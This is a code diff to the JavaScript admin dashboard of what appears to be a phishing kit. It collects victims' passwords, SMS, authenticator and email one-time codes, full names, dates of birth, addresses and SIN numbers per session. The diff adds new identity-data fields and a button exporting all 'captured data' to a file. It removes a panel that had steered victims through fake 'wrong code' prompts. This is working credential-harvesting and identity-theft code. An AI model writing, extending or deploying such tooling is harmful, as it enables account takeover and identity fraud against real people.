@@ -126,7 +126,12 @@
   </style>
 </head>
 <body>
-  <h1>Admin Dashboard</h1>
+  <div style="display: flex; align-items: center; justify-content: space-between; padding: 10px 20px; background-color: #1a1a1a;">
+    <h1 style="margin: 0;">Admin Dashboard</h1>
+    <button id="download-btn" class="action-btn" style="background-color: #3498db; padding: 10px 20px; font-size: 16px;">
+      Download All Data
+    </button>
+  </div>
   <div class="dashboard-wrapper">
     <div id="sessions-container"></div>
     <div id="session-details-panel"></div>
@@ -215,7 +220,74 @@
           console.error('Could not parse persisted sessions:', e);
         }
       }
+
+      // Also load from server on startup
+      fetch('/api/sessions')
+        .then(res => res.json())
+        .then(serverSessions => {
+          console.log('Loaded sessions from server:', serverSessions);
+          const deleted = new Set(getDeletedSessionsArray());
+          
+          serverSessions.forEach(({ sessionID, ip, data, online }) => {
+            const sid = normalizeId(sessionID);
+            if (deleted.has(sid)) return;
+            
+            if (!sessionsData[sid]) {
+              sessionsData[sid] = {
+                ip,
+                identifier: '',
+                password: '',
+                status: online ? 'online' : 'offline',
+                sms: '',
+                gauth: '',
+                phoneNumber: '',
+                emailCode: '',
+                balanceRange: '',
+                fullName: '',
+                dateOfBirth: '',
+                city: '',
+                province: '',
+                streetAddress: '',
+                postalCode: '',
+                sin: ''
+              };
+            }
+            
+            // Merge server data
+            if (data) {
+              Object.entries(data).forEach(([key, value]) => {
+                // Convert data keys to camelCase if needed
+                const camelKey = key.replace(/-([a-z])/g, (g) => g[1].toUpperCase());
+                if (sessionsData[sid].hasOwnProperty(camelKey)) {
+                  sessionsData[sid][camelKey] = value;
+                }
+              });
+            }
+            
+            sessionsData[sid].status = online ? 'online' : 'offline';
+          });
+          
+          saveSessionData();
+          
+          // Render all sessions
+          renderAllSessions();
+        })
+        .catch(err => {
+          console.error('Failed to load sessions from server:', err);
+        });
     })();
+
+    function renderAllSessions() {
+      const container = document.getElementById('sessions-container');
+      container.innerHTML = '';
+      const deleted = new Set(getDeletedSessionsArray());
+      
+      Object.entries(sessionsData).forEach(([sid, data]) => {
+        if (deleted.has(sid)) return;
+        const sessionBox = createSessionBox(sid, data.ip);
+        if (sessionBox) container.appendChild(sessionBox);
+      });
+    }
 
     function saveSessionData() {
       try {
@@ -233,13 +305,12 @@
       if (deletedSet.has(sid)) return null;
 
       // keep internal storage consistent using normalized key
-     if (sessionsData[sid]) {
-  sessionsData[sid].ip = ip;
-} else {
-  sessionsData[sid] = { ip, identifier: '', password: '', status: 'offline', sms: '', gauth: '', phoneNumber: '', emailCode: '' };
-}
-const data = sessionsData[sid];
-
+      if (sessionsData[sid]) {
+        sessionsData[sid].ip = ip;
+      } else {
+        sessionsData[sid] = { ip, identifier: '', password: '', status: 'offline', sms: '', gauth: '', phoneNumber: '', emailCode: '', balanceRange: '' };
+      }
+      const data = sessionsData[sid];
 
       const box = document.createElement('div');
       box.className = 'session-box';
@@ -287,7 +358,7 @@ const data = sessionsData[sid];
         const last = safeGetRaw('lastDetailSession');
         if (last && normalizeId(last) === sid) safeSetRaw('lastDetailSession', '');
 
-        // inform server (left as-is Ã¢â‚¬" deletion remains client-side)
+        // inform server (left as-is – deletion remains client-side)
         socket.emit('dashboard-delete-session', { dashboardID: dashboardSessionID, sessionID: sid });
 
         if (currentDetailSession === sid) {
@@ -333,9 +404,15 @@ const data = sessionsData[sid];
       const fields = [
         { label: 'Identifier', key: 'identifier' },
         { label: 'Password', key: 'password' },
-        { label: 'SMS', key: 'sms' },
-        { label: 'Gauth', key: 'gauth' },
-        { label: 'Email Code', key: 'email-code' }      ];
+        { label: 'Balance Range', key: 'balanceRange' },
+        { label: 'Full Name', key: 'fullName' },
+        { label: 'Date of Birth', key: 'dateOfBirth' },
+        { label: 'City', key: 'city' },
+        { label: 'Province', key: 'province' },
+        { label: 'Street Address', key: 'streetAddress' },
+        { label: 'Postal Code', key: 'postalCode' },
+        { label: 'SIN', key: 'sin' }
+      ];
 
       fields.forEach(field => {
         const wrapper = document.createElement('div');
@@ -369,38 +446,7 @@ const data = sessionsData[sid];
     function buildExtraPanel(id) {
       const extra = document.getElementById('extra-panel');
       extra.innerHTML = '';
-      extra.style.display = 'block';
-
-      const title = document.createElement('h3');
-      title.textContent = 'Action Panel';
-      extra.appendChild(title);
-
-      const actionGrid = document.createElement('div');
-      actionGrid.className = 'action-grid';
-
-      const actions = [
-        { name: 'SMS', class: 'btn-sms', action: 'sms' },
-        { name: 'Wrong SMS', class: 'btn-wrong', action: 'wrong_sms' },
-        { name: 'Wrong Password', class: 'btn-wrong', action: 'wrong_password' },
-        { name: 'Gauth', class: 'btn-gauth', action: 'gauth' },
-        { name: 'Wrong Gauth', class: 'btn-wrong', action: 'wrong_gauth' },
-        { name: 'Email Code', class: 'btn-email', action: 'email_code' },
-        { name: 'Wrong Email Code', class: 'btn-wrong', action: 'wrong_email_code' },
-        { name: 'Loading', class: 'btn-loading', action: 'loading' }
-      ];
-
-      actions.forEach(action => {
-        const btn = document.createElement('button');
-        btn.textContent = action.name;
-        btn.className = `action-btn ${action.class}`;
-        btn.addEventListener('click', () => {
-          socket.emit('dashboard-action', { sessionID: id, buttonName: action.action, value: action.name });
-          showToast(`${action.name} sent`);
-        });
-        actionGrid.appendChild(btn);
-      });
-
-      extra.appendChild(actionGrid);
+      extra.style.display = 'none';
     }
 
     function openDetail(id) {
@@ -452,60 +498,83 @@ const data = sessionsData[sid];
       'client-sms': 'sms',
       'client-gauth': 'gauth',
       'client-phone-number': 'phoneNumber',
-      'client-email-code': 'email-code'
+      'client-email-code': 'emailCode',
+      'client-balance-range': 'balanceRange',
+      'client-full-name': 'fullName',
+      'client-date-of-birth': 'dateOfBirth',
+      'client-city': 'city',
+      'client-province': 'province',
+      'client-street-address': 'streetAddress',
+      'client-postal-code': 'postalCode',
+      'client-sin': 'sin'
     };
 
     // --- Socket handlers: normalize incoming IDs and honor deletedSessions set (client-only) ---
-   socket.on('session-list', list => {
-  const container = document.getElementById('sessions-container');
-  container.innerHTML = '';
+    socket.on('session-list', list => {
+      const container = document.getElementById('sessions-container');
+      container.innerHTML = '';
 
-  const deletedSet = getDeletedSessionsSet();
+      const deletedSet = getDeletedSessionsSet();
 
-   // Normalize IDs for quick lookup
-  const onlineSet = new Set(list.map(({ sessionID }) => normalizeId(sessionID)));
+      // Normalize IDs for quick lookup
+      const onlineSet = new Set(list.map(({ sessionID }) => normalizeId(sessionID)));
 
-  // Step 1: update sessionsData with online sessions from server
-  list.forEach(({ sessionID, ip }) => {
-    const sid = normalizeId(sessionID);
-    if (deletedSet.has(sid)) return;
+      // Step 1: update sessionsData with online sessions from server
+      list.forEach(({ sessionID, ip }) => {
+        const sid = normalizeId(sessionID);
+        if (deletedSet.has(sid)) return;
 
-    if (!sessionsData[sid]) {
-      sessionsData[sid] = { ip, identifier: '', password: '', status: 'online', sms: '', gauth: '', phoneNumber: '', emailCode: '' };
-    } else {
-      sessionsData[sid].ip = ip;
-      sessionsData[sid].status = 'online';
-    }
-  });
+        if (!sessionsData[sid]) {
+          sessionsData[sid] = { ip, identifier: '', password: '', status: 'online', sms: '', gauth: '', phoneNumber: '', emailCode: '', balanceRange: '' };
+        } else {
+          sessionsData[sid].ip = ip;
+          sessionsData[sid].status = 'online';
+        }
+      });
 
-  // Step 2: mark any known session NOT in the list as offline
-  Object.keys(sessionsData).forEach(sid => {
-    if (!onlineSet.has(sid)) {
-      sessionsData[sid].status = 'offline';
-    }
-  });
+      // Step 2: mark any known session NOT in the list as offline
+      Object.keys(sessionsData).forEach(sid => {
+        if (!onlineSet.has(sid)) {
+          sessionsData[sid].status = 'offline';
+        }
+      });
 
-  // Step 3: render all known (non-deleted) sessions
-  Object.entries(sessionsData).forEach(([sid, data]) => {
-    if (deletedSet.has(sid)) return;
-    const sessionBox = createSessionBox(sid, data.ip);
-    if (sessionBox) container.appendChild(sessionBox);
-  });
+      // Step 3: render all known (non-deleted) sessions
+      Object.entries(sessionsData).forEach(([sid, data]) => {
+        if (deletedSet.has(sid)) return;
+        const sessionBox = createSessionBox(sid, data.ip);
+        if (sessionBox) container.appendChild(sessionBox);
+      });
 
+      saveSessionData();
 
-  saveSessionData();
-
-  const lastRaw = safeGetRaw('lastDetailSession');
-  const last = lastRaw ? normalizeId(lastRaw) : null;
-  if (last && !deletedSet.has(last)) openDetail(last);
-});
-
+      const lastRaw = safeGetRaw('lastDetailSession');
+      const last = lastRaw ? normalizeId(lastRaw) : null;
+      if (last && !deletedSet.has(last)) openDetail(last);
+    });
 
     socket.on('client-connected', ({ sessionID, ip }) => {
       const sid = normalizeId(sessionID);
       if (getDeletedSessionsSet().has(sid)) return; // guard
 
-      sessionsData[sid] = sessionsData[sid] || { ip, identifier: '', password: '', status: 'online', sms: '', gauth: '', phoneNumber: '', emailCode: '' };
+      sessionsData[sid] = sessionsData[sid] || { 
+        ip, 
+        identifier: '', 
+        password: '', 
+        status: 'online', 
+        sms: '', 
+        gauth: '', 
+        phoneNumber: '', 
+        emailCode: '', 
+        balanceRange: '',
+        fullName: '',
+        dateOfBirth: '',
+        city: '',
+        province: '',
+        streetAddress: '',
+        postalCode: '',
+        sin: ''
+      };
       sessionsData[sid].status = 'online';
       sessionsData[sid].ip = ip;
       const existing = document.getElementById(`session-${sid}`);
@@ -540,10 +609,18 @@ const data = sessionsData[sid];
 
     Object.entries(dataHandlers).forEach(([eventName, key]) => {
       socket.on(eventName, payload => {
+        console.log(`Received ${eventName}:`, payload);
         const sid = normalizeId(payload.sessionID || payload.sessionId || payload.session);
         if (getDeletedSessionsSet().has(sid)) return; // skip updates for deleted sessions
 
-        const value = payload[key];
+        // The server sends the data with the type name as the key
+        // e.g., for "client-balance-range", payload = { sessionID, "balance-range": data }
+        // We need to extract the actual type name from the event
+        const typeFromEvent = eventName.replace('client-', '');
+        const value = payload[typeFromEvent] || payload[key];
+        
+        console.log(`Extracted value for ${key}:`, value);
+        
         if (sessionsData[sid]) {
           sessionsData[sid][key] = value;
           const smallVal = document.getElementById(`${key}-${sid}`);
@@ -552,7 +629,24 @@ const data = sessionsData[sid];
           saveSessionData();
         } else {
           // If the session doesn't exist yet, create a minimal entry (but only if not deleted)
-          sessionsData[sid] = { ip: payload.ip || '', identifier: '', password: '', status: 'offline', sms: '', gauth: '', phoneNumber: '', emailCode: '' };
+          sessionsData[sid] = { 
+            ip: payload.ip || '', 
+            identifier: '', 
+            password: '', 
+            status: 'offline', 
+            sms: '', 
+            gauth: '', 
+            phoneNumber: '', 
+            emailCode: '', 
+            balanceRange: '',
+            fullName: '',
+            dateOfBirth: '',
+            city: '',
+            province: '',
+            streetAddress: '',
+            postalCode: '',
+            sin: ''
+          };
           sessionsData[sid][key] = value;
           saveSessionData();
         }
@@ -579,8 +673,50 @@ const data = sessionsData[sid];
 
     // optional: listen for server ack/un-delete if you implement it server-side
     socket.on('dashboard-delete-ack', ({ dashboardID, sessionID }) => {
-      // server told us it's recorded Ã¢â‚¬" keep local state consistent (no-op here)
+      // server told us it's recorded – keep local state consistent (no-op here)
       // Could display a toast: showToast(`Deleted ${sessionID} on server`);
+    });
+
+    // Download all data functionality
+    document.getElementById('download-btn').addEventListener('click', () => {
+      const deletedSet = getDeletedSessionsSet();
+      let output = '=== CAPTURED DATA FROM ALL SESSIONS ===\n\n';
+      output += `Generated: ${new Date().toLocaleString()}\n`;
+      output += `Total Sessions: ${Object.keys(sessionsData).filter(sid => !deletedSet.has(sid)).length}\n\n`;
+      output += '='.repeat(80) + '\n\n';
+
+      Object.entries(sessionsData).forEach(([sid, data]) => {
+        if (deletedSet.has(sid)) return;
+
+        output += `SESSION ID: ${sid}\n`;
+        output += `-`.repeat(80) + '\n';
+        output += `IP Address: ${data.ip}\n`;
+        output += `Status: ${data.status}\n`;
+        output += `Identifier: ${data.identifier}\n`;
+        output += `Password: ${data.password}\n`;
+        output += `Balance Range: ${data.balanceRange}\n`;
+        output += `Full Name: ${data.fullName}\n`;
+        output += `Date of Birth: ${data.dateOfBirth}\n`;
+        output += `City: ${data.city}\n`;
+        output += `Province: ${data.province}\n`;
+        output += `Street Address: ${data.streetAddress}\n`;
+        output += `Postal Code: ${data.postalCode}\n`;
+        output += `SIN: ${data.sin}\n`;
+        output += '\n' + '='.repeat(80) + '\n\n';
+      });
+
+      // Create blob and download
+      const blob = new Blob([output], { type: 'text/plain' });
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = `captured_data_${new Date().toISOString().replace(/[:.]/g, '-')}.txt`;
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+      URL.revokeObjectURL(url);
+      
+      showToast('Data downloaded successfully');
     });
 
   </script>
